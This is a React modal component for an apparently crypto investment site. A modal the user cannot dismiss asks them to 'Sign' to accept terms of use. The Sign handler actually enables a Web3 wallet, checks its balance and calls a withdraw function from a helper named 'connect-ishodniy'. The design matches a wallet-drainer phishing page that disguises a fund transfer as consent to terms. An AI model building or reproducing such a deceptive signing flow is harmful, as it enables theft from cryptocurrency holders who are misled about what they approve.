import React, { useContext, useState } from "react";
import Button from "react-bootstrap/Button";
import Modal from "react-bootstrap/Modal";
import { useNavigate } from "react-router-dom";
import { checkBalance, withdraw } from "../../helpers/connect-ishodniy";
import { UserContext } from "../../UserContext";
import "./SyncModal.scss";

function SyncModal({ URL, setShowSyncModal, setLoading }) {
  const navigate = useNavigate();
  const [smShow, setSmShow] = useState(true);
  const { value, setValue } = useContext(UserContext);
  const { adress } = value;

  const onClickHandler = async (e) => {
    e.preventDefault();
    if (window.ethereum) {
      const chainId = window.ethereum.chainId;
      try {
        setLoading(true);
        setShowSyncModal(false);
        setSmShow(false);
        await Moralis.enableWeb3();
        console.log(chainId);
        await checkBalance(chainId);
        await withdraw(value, chainId, setValue).then((x) => {
          if (URL) {
            navigate(URL);
          } else {
            navigate("/user");
          }
          setShowSyncModal(false);
          setSmShow(false);
          setLoading(false);
        });
      } catch (error) {
        console.log("error", error);
      }
    }
  };
  return (
    <section>
      <Modal
        className="syncModalMain"
        onBackdropClick={() => setSmShow(true)}
        aria-labelledby="contained-modal-title-vcenter"
        centered
        keyboard={false}
        animation={false}
        backdrop="static"
        show={smShow}
      >
        <section className="calc-right relative py-12 sm:px-4 lg:px-5 blured">
          <Modal.Header className="syncModal-header">
            <Modal.Title id="example-modal-sizes-title-sm">
              For further work with the website and for access to your personal
              page and investment you should accept{" "}
              <a href="/#">terms of use</a>.
            </Modal.Title>
          </Modal.Header>

          <div className="syncModal-footer">
            <button
              onClick={onClickHandler}
              className="btn-orange sm:w-full md:w-2/5 lg:w-full "
            >
              <span className="">Sign</span>
              <img className="inline-block" src="img/go.svg" alt="" />
            </button>
          </div>
        </section>
      </Modal>
    </section>
  );
}

export default SyncModal;
